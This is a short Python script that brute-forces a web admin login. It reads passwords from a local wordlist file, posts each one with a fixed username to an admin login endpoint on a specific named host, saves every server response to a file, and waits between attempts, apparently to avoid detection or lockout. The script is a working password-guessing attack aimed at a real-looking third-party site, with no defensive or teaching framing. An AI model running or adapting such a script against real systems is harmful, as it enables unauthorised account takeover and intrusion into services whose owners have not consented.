#!/usr/bin/python
# -*- coding: UTF-8 -*-
import requests as rq
import time
import sys
from requests.auth import HTTPBasicAuth
def Brute_Force_Web(password):
    url = "http://qqzhms9.khg88.cc/admin.php/Home/Login/login_do.html"
    headers = {'Accept': 'application/json','X-Requested-With': 'XMLHttpRequest'}
    data = {'username':'kefu886886','password':password}
    res = rq.post(url=url, data=data,headers=headers)
    with open("d:\\ok.txt","a+") as f:
        f.write(res.text)
        f.write("\n\r")

def GetPass():
    fp = open("d:\\pass.txt","r")
    if fp == 0:
        print ("open file error!")
        return
    while 1:
        line = fp.readline()
        if not line:
            break
        passwd = line.strip('\n')
        Brute_Force_Web(passwd)
        time.sleep(10)
GetPass()